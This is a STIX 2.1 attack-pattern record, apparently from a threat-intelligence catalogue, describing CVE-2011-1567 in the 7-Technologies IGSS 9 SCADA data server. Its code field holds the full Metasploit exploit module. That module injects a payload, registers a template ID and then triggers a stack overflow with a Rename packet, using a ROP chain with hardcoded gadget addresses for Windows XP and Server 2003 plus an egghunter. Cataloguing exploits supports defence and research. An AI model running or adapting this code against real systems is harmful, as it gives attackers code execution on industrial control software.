{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f092e775-e18e-4e37-80bf-f38b44ce708f",
    "created": "2024-08-14T16:39:25.102709Z",
    "modified": "2024-08-14T16:39:25.102713Z",
    "name": "\"7-Technologies IGSS 9 IGSSdataServer .RMS Rename Buffer Overflow\"",
    "description": " This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report which results arbitrary code execution under the context of the user.  The attack is carried out in three stages.  The first stage sends the final payload to IGSSdataServer.exe, which will remain in memory.  The second stage sends the Add command so the process can find a valid ID for the Rename command.  The last stage then triggers the vulnerability with the Rename command, and uses an egghunter to search for the shellcode that we sent in stage 1.  The use of egghunter appears to be necessary due to the small buffer size, which cannot even contain our ROP chain and the final payload.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/igss9_igssdataserver_rename.rb",
            "external_id": "igss9_igssdataserver_rename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1567"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/igss_5-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"7-Technologies IGSS 9 IGSSdataServer .RMS Rename Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying\n        a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command,\n        a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report,\n        which results arbitrary code execution under the context of the user.\n\n        The attack is carried out in three stages.  The first stage sends the final payload to\n        IGSSdataServer.exe, which will remain in memory.  The second stage sends the Add command\n        so the process can find a valid ID for the Rename command.  The last stage then triggers\n        the vulnerability with the Rename command, and uses an egghunter to search for the\n        shellcode that we sent in stage 1.  The use of egghunter appears to be necessary due to\n        the small buffer size, which cannot even contain our ROP chain and the final payload.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma <aluigi[at]autistici.org>',  #Initial discovery, poc\n          'sinn3r',                                    #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-1567'],\n          ['OSVDB', '72352'],\n          ['URL', 'http://aluigi.altervista.org/adv/igss_5-adv.txt'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"seh\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3',\n            {\n              'Ret'          => 0x1B0938B8, #ADD ESP,910; RETN 10 MSJET40.dll\n              'RopOffset'    => 68,         #Offset to the ROP chain\n              'Offset'       => 500,        #Offset to SE Handler (stack pivot)\n              'Max'          => 8000,       #Max buffer size\n            }\n          ],\n          [\n            'Windows Server 2003 SP2/R2 SP2',\n            {\n              'Ret'       => 0x1B093622, #ADD ESP,910; RETN 10 MSJET40.dll\n              'RopOffset' => 76,         #Offset to the ROP chain\n              'Offset'    => 500,        #Offset to SE Handler (stack pivot)\n              'Max'       => 8000,       #Max buffer size\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-24'))\n\n      register_options(\n        [\n          Opt::RPORT(12401, false),\n        ]\n      )\n  end\n\n  #We need to send the Add command first, so that IGSSdataServer.exe can find the 'ID' before\n  #triggering the vulnerable code path we're trying to hit.  Without this, we'll just hit\n  #\"FAILED renameDicRec.  ID not found %s\" (logText function).\n  def add_template(id)\n    buf  = ''\n    buf << \"\\x9b\\x00\"  #Packet size\n    buf << \"\\x01\\x00\\x34\\x12\"\n    buf << \"\\x07\"      #Opcode\n    buf << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    buf << \"\\x01\"      #Flag\n    buf << \"\\x00\\x00\\x00\"\n    buf << \"\\x04\"      #Command (add)\n    buf << \"\\x00\\x00\\x00\"\n    buf << id\n    buf << \"\\x00\"\n    buf << \"\\x00\"*31\n    buf << \"\\x78\"\n    buf << \"\\x00\"*63\n    buf << \"\\x78\"\n    buf << \"\\x00\"*28\n\n    connect\n\n    sock.put(buf)\n\n    print_status(\"Sending ADD command to #{datastore['RHOST']}\")\n    res = sock.recv(1024)\n\n    disconnect\n\n    return res\n  end\n\n  #Since we don't have a lot of space on the stack when we trigger the overflow, we send a\n  #separate packet that contains our final payload, and let egghunter look for it later in memory\n  def inject_payload(my_payload)\n\n    buf  = ''\n    buf << \"\\x01\\x00\\x34\\x12\"\n    buf << \"\\x0D\"  #Opcode\n    buf << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    buf << \"\\x01\"  #Flag\n    buf << \"\\x00\\x00\\x00\"\n    buf << \"\\x01\"  #Command (ListAll)\n    buf << \"\\x00\\x00\\x00\"\n    buf << my_payload\n    buf << Rex::Text.rand_text_alpha(1024-my_payload.length)\n    buf << \"\\x00\"*130\n\n    #Packet size\n    buf_size = [buf.length + 2].pack('v')\n    buf = buf_size + buf\n\n    connect\n\n    sock.put(buf)\n    print_status(\"Injecting payload in memory to #{datastore['RHOST']}\")\n\n    disconnect\n  end\n\n  #It's definitely junk\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def sploit_rename(id)\n    #Egghunter is used because we don't really have a lot of space on the stack\n    #to fit the ROP chain and a larger payload\n    eggoptions =\n    {\n      :checksum  => true,\n      :eggtag    => 'W00T',\n      :depmethod => 'virtualprotect',\n      :depreg    => 'esi'\n    }\n\n    hunter, p = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    #depreg  (Put VirtualProtect in ESI)\n    esi  = \"\\x81\\xf6\\x16\\x1b\\x5f\\x5e\"  #XOR ESI, 0x5E5F1B16\n    esi << \"\\x3e\\x8b\\x36\"              #MOV ESI, DWORD PTR DS:[ESI]\n\n    #Put depreg alignment\n    hunter = esi + hunter\n\n    #Send final payload first, and let egghunter look for it\n    inject_payload(p)\n\n    #Max ROP chain size we can use is 406 bytes\n    rop  = [\n      :xchg_esp_ebp,\n      #0x59ABA24B,  #PUSH ESP # POP EBP # RETN  [dbghelp.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x1B76A59E,  #XCHG EAX,EBP # RETN  [dao360.dll]\n      0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]\n      :add_eax_100,\n      #0x1B09FA13,  #ADD EAX,100 # RETN 0C  [MSJET40.DLL]\n\n      #VirtualProtect Argument ([0x540214])\n      :xchg_eax_ecx,\n      junk,\n      junk,\n      junk,\n      :pop_eax,\n      0x3BABFD6D,  #0x3BABFD6D xor 0x3BFFFF79\n      0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]\n      0x1b73f3bd,  #MOV EAX,DWORD PTR DS:[EAX] # RETN  [dao360.dll]\n      :xchg_eax_ecx,\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n      0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]\n\n      #Retn:\n      :xchg_eax_esi,\n      #0x1B0505C1,  #PUSH EAX # POP ESI # RETN 4  [MSJET40.DLL]\n      0x1B8260DD,  #ADD EAX,20 # RETN  [Module : msjtes40.dll]\n      junk,\n      0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]\n      0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]\n      0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]\n      :xchg_eax_ecx,\n      :mov_eax_esi_pop_esi,\n      #0x1B03AD44,  #MOV EAX,ESI # POP ESI # RETN  [MSJET40.DLL]\n      0x5E0B1902,  #:depreg initial value to xor\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n      0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]\n\n      #Shellcode:\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n      0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]\n\n      #Size (100 bytes -- enough for egghunter)\n      :xchg_eax_ecx,\n      :pop_eax,\n      :size_xor,\n      0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]\n      :xchg_eax_ecx,\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n      0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]\n\n      #newProtect (0x40):\n      :xchg_eax_ecx,\n      :pop_eax,\n      0x3BFFFF39,  #0x3BFFFF39 xor 0x3BFFFF79\n      0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]\n      :xchg_eax_ecx,\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n      0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]\n\n      #oldProtect\n      0x1B731395,  #POP ECX # RETN  [dao360.dll]\n      0x1B82B410,  #.data section (WR) in msjtes40.dll\n      0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]\n\n      #Align the rewind part\n      0x1B829E86,  # ADD EAX,0C # RETN  [msjtes40.dll]\n\n      #Rewind\n      :rewind,\n\n      #Execute\n      0x1B72A833,  #XCHG EAX,ESP # RETN  [dao360.dll]\n    ]\n\n    #OS specific gadgets\n    rop.map! do |gadget|\n      if gadget == :xchg_esp_ebp\n        (target.name =~ /xp/i) ? 0x59ABA24B : 0x6D5E2223\n      elsif gadget == :add_eax_100\n        (target.name =~ /xp/i) ? 0x1B09FA13 : 0x1B09F6F3\n      elsif gadget == :xchg_eax_esi\n        (target.name =~ /xp/i) ? 0x1B0505C1 : 0x1B051B71\n      elsif gadget == :xchg_eax_ecx\n        (target.name =~ /xp/i) ? 0x1B02708C : 0x1B02B28D\n      elsif gadget == :mov_eax_esi_pop_esi\n        (target.name =~ /xp/i) ? 0x1B03AD44 : 0x1B110735\n      elsif gadget == :pop_eax\n        (target.name =~ /xp/i) ? 0x1B0C65B6 : 0x1B0c6169\n      elsif gadget == :size_xor\n        (target.name =~ /xp/i) ? 0x3BFFFF01 : 0x3BFFFF1D\n      elsif gadget == :rewind\n        (target.name =~ /xp/i) ? 0x1B03D70A : 0x1B03C741\n      else\n        gadget\n      end\n    end\n\n    rop = rop.pack('V*')\n\n    sploit  = ''\n    sploit << Rex::Text.rand_text_alpha(target['RopOffset'])\n    sploit << rop\n    sploit << Rex::Text.rand_text_alpha(target['Offset']-sploit.length)\n    sploit << [target.ret].pack('V')  #Pivot\n    sploit << make_nops(12)  #Padding\n    sploit << hunter\n    sploit << Rex::Text.rand_text_alpha(target['Max']-sploit.length)\n\n    #Create the packet with our naughty payload\n    pkt  = \"\\x00\\x04\"  #Funky size causes overflow\n    pkt << \"\\x01\\x00\\x34\\x12\"\n    pkt << \"\\x07\"      #Opcode\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x02\"      #Flag\n    pkt << \"\\x00\\x00\\x00\"\n    pkt << \"\\x02\"      #Command\n    pkt << \"\\x00\\x00\\x00\"\n    pkt << id\n    pkt << \"\\x00\"\n    pkt << sploit\n\n    connect\n\n    print_status(\"Sending malicious request to #{datastore['RHOST']}\")\n    sock.put(pkt)\n\n    handler\n\n    #egghunter takes a few seconds, wait a bit before disconnect\n    select(nil, nil, nil, 3)\n    disconnect\n  end\n\n  def exploit\n    id = Rex::Text.rand_text_alpha(8)\n\n    res = add_template(id)\n    if res !~ /Report/i\n      print_error(\"Failed to add template:#{res}\")\n      return\n    end\n\n    sploit_rename(id)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-24",
    "x_mitre_platforms": [
        "win'"
    ]
}